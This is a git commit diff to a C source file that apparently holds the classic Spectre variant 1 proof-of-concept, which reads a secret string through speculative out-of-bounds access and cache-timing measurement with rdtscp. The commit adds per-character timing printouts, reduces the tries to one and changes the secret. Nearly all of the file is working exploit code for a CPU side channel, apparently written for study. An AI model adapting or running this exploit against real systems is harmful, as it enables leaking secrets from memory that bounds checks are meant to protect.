1da2503cf786a36ed06cece487aaa2e49e18357c
lizeren <li3103@purdue.edu>
2024-02-06 19:37:08 -0500

    see timer diff

--- Source.c
+++ Source.c
@@ -19,10 +19,12 @@ Victim code.
 unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
+uint8_t result_char[40];
+uint8_t result_hit_time[40];
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
 
-char* secret = "The Magic Words are Squeamish Ossifrage.";
+char* secret = "The Magic Words are 123456 Ossifrage.";
 
 uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
 
@@ -40,18 +42,18 @@ Analysis code
 #define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
-void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
+void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], int counter)
 {
 	static int results[256];
 	int tries, i, j, k, mix_i;
 	unsigned int junk = 0;
 	size_t training_x, x;
-	register uint64_t time1, time2;
+	register uint64_t time1, time2, time_diff;
 	volatile uint8_t* addr;
 
 	for (i = 0; i < 256; i++)
 		results[i] = 0;
-	for (tries = 999; tries > 0; tries--)
+	for (tries = 1; tries > 0; tries--)
 	{
 		/* Flush array2[256*(0..255)] from cache */
 		for (i = 0; i < 256; i++)
@@ -84,6 +86,12 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 			time1 = __rdtscp(&junk); /* READ TIMER */
 			junk = *addr; /* MEMORY ACCESS TO TIME */
 			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+			time_diff = time2;
+			printf("char %d has hit time:%ld\n",mix_i,time_diff);
+			if(time_diff <= result_hit_time[counter] && mix_i != array1[tries % array1_size]){
+				result_hit_time[counter] = time_diff;
+				result_char[counter] = mix_i;
+			}
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
 				results[mix_i]++; /* cache hit - add +1 to score for this value */
 		}
@@ -102,47 +110,61 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 				k = i;
 			}
 		}
-		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
+		
+		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)){
 			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+		}
+			
 	}
 	results[0] ^= junk; /* use junk so code above won't get optimized out*/
 	value[0] = (uint8_t)j;
 	score[0] = results[j];
 	value[1] = (uint8_t)k;
 	score[1] = results[k];
+	//printf("i:%c is %d, j:%c is %d\n",i,results[i],j,results[j]);
+
 }
 
 int main(int argc, const char* * argv)
 {
-	printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
+	//printf("Putting '%s' in memory, address %p\n", secret, (void *)(secret));
 	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
 	int score[2], len = strlen(secret);
+	printf("len%d\n",len);
 	uint8_t value[2];
+	int i;
 
-	for (size_t i = 0; i < sizeof(array2); i++)
+
+
+	for (i = 0; i < sizeof(array2); i++)
 		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
+	
+	for(i = 0; i < sizeof(result_hit_time); i++){
+		result_hit_time[i] = 80;
+	}
 	if (argc == 3)
 	{
 		sscanf_s(argv[1], "%p", (void * *)(&malicious_x));
 		malicious_x -= (size_t)array1; /* Convert input value into a pointer */
 		sscanf_s(argv[2], "%d", &len);
-		printf("Trying malicious_x = %p, len = %d\n", (void *)malicious_x, len);
+		//printf("Trying malicious_x = %p, len = %d\n", (void *)malicious_x, len);
 	}
 
-	printf("Reading %d bytes:\n", len);
+	//printf("Reading %d bytes:\n", len);
+	int counter = 0;
 	while (--len >= 0)
-	{
-		printf("Reading at malicious_x = %p... ", (void *)malicious_x);
-		readMemoryByte(malicious_x++, value, score);
-		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-		printf("0x%02X='%c' score=%d ", value[0],
-		       (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+	{	
+		printf("~~~~~~~~~~~~~~%d %c %d~~~~~~~~~~~~~~~\n",counter,*(secret+counter),*(secret+counter));
+		//printf("Reading at malicious_x = %p... ", (void *)malicious_x);
+		readMemoryByte(malicious_x++, value, score,counter);
+		//printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
+		//printf("0x%02X='%c' score=%d ", value[0],(value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
 		if (score[1] > 0)
-			printf("(second best: 0x%02X='%c' score=%d)", value[1],
-				   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
-				   score[1]);
-		printf("\n");
+			//printf("(second best: 0x%02X='%c' score=%d)", value[1],(value[1] > 31 && value[1] < 127 ? value[1] : '?'),score[1]);
+		//printf("\n");
+		counter += 1;
 	}
+
 #ifdef _MSC_VER
 	printf("Press ENTER to exit\n");
 	getchar();	/* Pause Windows console */
